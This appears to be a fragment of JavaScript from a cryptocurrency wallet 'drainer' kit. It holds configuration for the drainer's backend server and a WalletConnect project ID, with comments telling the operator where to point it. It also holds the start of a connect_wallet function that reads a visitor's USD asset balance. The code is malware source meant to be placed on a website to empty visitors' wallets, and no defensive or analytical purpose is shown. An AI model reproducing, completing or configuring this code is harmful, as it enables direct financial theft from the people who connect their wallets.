...
const MS_Server = "127.0.0.1:3001"; // Specify the domain that is attached to the drainer server edit line 431 for https or http
// This is the domain where you have a server, and not the site itself where you plan to use the drainer
const MS_WalletConnect_ID = "33639b03c149a35b3cf1cdc0d3eda460"; // Project ID from WalletConnect Cloud
...
const connect_wallet = async (provider = null) => {
  try {
	...
	console.log(assets_usd_balance);
